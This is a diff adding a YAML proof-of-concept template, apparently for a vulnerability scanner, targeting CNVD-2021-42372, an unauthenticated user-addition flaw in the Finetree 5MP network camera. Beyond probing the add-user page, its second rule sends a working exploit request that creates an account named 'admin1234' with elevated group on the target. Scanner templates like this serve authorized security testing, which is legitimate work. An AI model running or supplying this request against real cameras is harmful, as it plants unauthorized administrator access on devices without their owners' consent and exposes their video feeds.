@@ -1,0 +1,27 @@
+expression: r0() && r1()
+id: CNVD-2021-42372
+info:
+  author: zan8in
+  description: "Finetree 5MP \u6444\u50CF\u673A user_pop.php\u6587\u4EF6\u5B58\u5728\
+    \u672A\u6388\u6743\u4EFB\u610F\u7528\u6237\u6DFB\u52A0\uFF0C\u653B\u51FB\u8005\
+    \u6DFB\u52A0\u540E\u53EF\u4EE5\u83B7\u53D6\u540E\u53F0\u6743\u9650\np=\"Finetree-5MP-Network-Camera\"\
+    \n"
+  name: "Finetree 5MP \u6444\u50CF\u673A user_pop.php \u4EFB\u610F\u7528\u6237\u6DFB\
+    \u52A0\u6F0F\u6D1E"
+  reference:
+  - http://wiki.peiqi.tech/wiki/iot/Finetree/Finetree%205MP%20%E6%91%84%E5%83%8F%E6%9C%BA%20user_pop.php%20%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E6%B7%BB%E5%8A%A0%E6%BC%8F%E6%B4%9E%20CNVD-2021-42372.html
+  severity: high
+rules:
+  r0:
+    expression: response.status == 200 && response.body.bcontains(b'name="user_name_field"')
+      && response.body.bcontains(b'name="password_field"') && response.body.bcontains(b'name="confirm_password_field"')
+    request:
+      method: GET
+      path: /quicksetup/user_pop.php?method=add
+  r1:
+    expression: response.status == 200 && response.headers["server"].contains("WintenDo")
+      && (response.body.bcontains(b'200') || response.body.bcontains(b'804'))
+    request:
+      body: method=add&user=admin1234&pwd=admin1234&group=2&ptz_enable=0
+      method: POST
+      path: /quicksetup/user_update.php
